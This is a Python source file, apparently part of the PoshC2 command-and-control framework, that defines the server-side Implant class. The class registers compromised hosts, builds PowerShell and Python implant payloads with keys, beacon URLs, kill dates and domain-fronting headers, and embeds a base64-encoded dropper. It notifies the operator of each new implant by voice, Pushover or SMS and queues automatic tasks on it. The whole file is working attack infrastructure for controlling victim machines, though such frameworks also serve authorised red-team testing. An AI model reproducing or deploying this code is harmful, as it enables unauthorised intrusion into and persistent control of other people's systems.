#!/usr/bin/env python

from DB import *
from Colours import *
from Core import *
from AutoLoads import *
from ImplantHandler import *
import urllib2

class Implant(object):

  def __init__(self, ipaddress, pivot, domain, user, hostname, arch, pid, proxy):
    self.RandomURI = randomuri()
    self.Label = None
    self.User = user
    self.Hostname = hostname
    self.IPAddress = ipaddress
    self.Key = gen_key()
    self.FirstSeen = (datetime.datetime.now()).strftime("%m/%d/%Y %H:%M:%S")
    self.LastSeen = (datetime.datetime.now()).strftime("%m/%d/%Y %H:%M:%S")
    self.PID = pid
    self.Proxy = proxy
    self.Arch = arch
    self.Domain = domain
    self.DomainFrontHeader = get_dfheader()
    self.Alive = "Yes"
    self.UserAgent = get_defaultuseragent()
    self.Sleep = get_defaultbeacon()
    self.ModsLoaded = ""
    self.Pivot = pivot
    self.KillDate = get_killdate()
    self.ServerURL = new_serverurl = select_item("HostnameIP", "C2Server")
    self.AllBeaconURLs = get_otherbeaconurls()
    self.AllBeaconImages = get_images()
    self.SharpCore = """
RANDOMURI19901%s10991IRUMODNAR
URLS10484390243%s34209348401SLRU
KILLDATE1665%s5661ETADLLIK
SLEEP98001%s10089PEELS
NEWKEY8839394%s4939388YEKWEN
IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDate, self.Sleep, self.Key, self.AllBeaconImages)
    with open("%spy_dropper.py" % (PayloadsDirectory), 'rb') as f:
        self.PythonImplant = base64.b64encode(f.read())
    py_implant_core = open("%s/PyImplant-Core.py" % FilesDirectory, 'r').read()
    self.PythonCore = py_implant_core % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Key, self.RandomURI, self.UserAgent)
    ps_implant_core = open("%s/PSImplant-Core.ps1" % FilesDirectory, 'r').read()
    self.C2Core = ps_implant_core % (self.Key, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs)
#Add all db elements

  def display(self):
    print Colours.GREEN,""
    it = self.Pivot
    if (it == "OSX"):
      it = "Python"
    print "New %s implant connected: (uri=%s key=%s)" % (it, self.RandomURI, self.Key)
    print "%s | Time:%s | PID:%s | Sleep:%s | %s (%s) | URL:%s" % (self.IPAddress, self.FirstSeen, self.PID, self.Sleep, (self.User+" @ "+self.Hostname), self.Arch, self.Proxy)
    print "",Colours.END

    try:
      sound = select_item("Sounds","C2Server")
      if sound == "Yes":
        import pyttsx3
        engine = pyttsx3.init()
        rate = engine.getProperty('rate')
        voices = engine.getProperty('voices')
        engine.setProperty('voice', "english-us")
        engine.setProperty('rate', rate-30)
        engine.say("Nice, we have an implant")
        engine.runAndWait()
    except Exception as e:
      EspeakError = "espeak error"

    try:
      apikey = select_item("APIKEY","C2Server")
      mobile = select_item("MobileNumber","C2Server")
      enotifications = select_item("EnableNotifications","C2Server")
      poapitoken = select_item("APIToken","C2Server")
      poapiuser = select_item("APIUser","C2Server")

      if enotifications == "Yes":
        import httplib, urllib
        conn = httplib.HTTPSConnection("api.pushover.net:443")
        conn.request("POST", "/1/messages.json",
          urllib.urlencode({
            "token": poapitoken,
            "user": poapiuser,
            "message": "NewImplant: %s @ %s" % (self.User,self.Hostname),
          }), { "Content-type": "application/x-www-form-urlencoded" })
        conn.getresponse()

      if enotifications == "Yes" and apikey and mobile:
        for number in mobile.split(","):
          number = number.replace('"','')
          url = "https://api.clockworksms.com/http/send.aspx?key=%s&to=%s&from=PoshC2&content=NewImplant:%s\%s @ %s" % (apikey, number, self.Domain,self.User,self.Hostname)
          url = url.replace(" ","+")
          response = urllib2.urlopen(url)
    except Exception as e:
      print "SMS send error: %s" % e
      
  def save(self):
    new_implant(self.RandomURI, self.User, self.Hostname, self.IPAddress, self.Key, self.FirstSeen, self.FirstSeen, self.PID, self.Proxy, self.Arch, self.Domain, self.Alive, self.Sleep, self.ModsLoaded, self.Pivot, self.Label)

  def autoruns(self):
    new_task("loadmodule Core.ps1", self.RandomURI)
    update_mods("Core.ps1", self.RandomURI)
    result = get_autoruns()
    if result:
      autoruns = ""
      for autorun in result:
        new_task(autorun[1], self.RandomURI)
